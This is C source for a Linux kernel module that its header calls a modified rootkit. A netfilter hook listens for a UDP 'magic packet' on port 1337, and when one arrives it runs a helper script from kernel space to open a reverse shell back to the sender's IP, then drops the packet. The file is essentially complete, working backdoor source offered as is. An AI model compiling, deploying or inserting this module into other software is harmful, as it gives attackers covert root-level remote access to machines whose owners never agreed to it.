/* NO LONGER ORIGINAL,  THIS IS A MODIFIED VERSION OF NISAY759'S ROOTKIT GET THE ORIGINAL FROM HERE nisay759/linux-rootkits  */
/*


This was modified, by me in order to improve & make this compile and run properly on my machine.

Quick modification summary:


nf register:
from: nf_register_hook(&rk_pre_routing);
to:   nf_register_net_hook(&init_net,&rk_pre_routing);

from: nf_unregister_hook(&rk_pre_routing);
to:   nf_unregister_net_hook(&init_net,&rk_pre_routing);



*/

#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/ip.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/skbuff.h>
#include <linux/udp.h>
#include <linux/kmod.h>
#include <linux/preempt.h>

static int __init erk_init(void);
static void __exit erk_exit(void);

module_init(erk_init);
module_exit(erk_exit);

static int invoke_reverse_shell(char *ip, char *port)
{
	int ret;
	char *argv[] = { "/usr/bin/reverse_shell.sh", ip, port, NULL };
	static char *env[] = { "HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
	
	ret = call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
	
	return ret;
}

static unsigned int rk_hook(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
{
	if(!skb) return NF_ACCEPT;

	struct iphdr *ip_header = ip_hdr(skb);

	if(!ip_header || !ip_header->protocol) return NF_ACCEPT;
	
	if(ip_header->protocol != 17) return NF_ACCEPT;
	
	struct udphdr *udp_header = udp_hdr(skb);
	unsigned int dst_prt = (unsigned int)ntohs(udp_header->dest);

	/* Max ip length : "xxx.xxx.xxx.xxx\0" */
	char ip[16];
	/* Max port length : "65535\0" */
	char port[6];
	if(dst_prt == 1337)
	{
		pr_info("NFhook: received magic packet\n");
		snprintf(ip, sizeof(ip), "%pI4", &ip_header->saddr);
		snprintf(port, sizeof(port), "%u", dst_prt);
		preempt_disable();
		if (invoke_reverse_shell(ip, port) < 0)
			pr_info("NFhook: Failed to spawn reverse shell\n");
		preempt_enable();
		return NF_DROP;
	}
	return NF_ACCEPT;
}

static struct nf_hook_ops rk_pre_routing = {
	.hook = rk_hook,
	.hooknum = NF_INET_PRE_ROUTING,
	.pf = PF_INET,
	.priority = NF_IP_PRI_FIRST,
};

// Modified // 
static int __init erk_init(void)
{
	//nf_register_hook(&rk_pre_routing);
	nf_register_net_hook(&init_net,&rk_pre_routing);
	pr_info("NFhook: LKM succefully loaded!\n");
	
	return 0;
}

// Modified // 
static void __exit erk_exit(void)
{

	// nf_unregister_hook(&rk_pre_routing);
	nf_unregister_net_hook(&init_net,&rk_pre_routing);
	pr_info("NFhook: LKM succefully unloaded!\n");
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Yassine Tioual");
MODULE_VERSION("0.1");

// Again, this is the modified version. Not the original. Find the original from here: https://github.com/nisay759/linux-rootkits
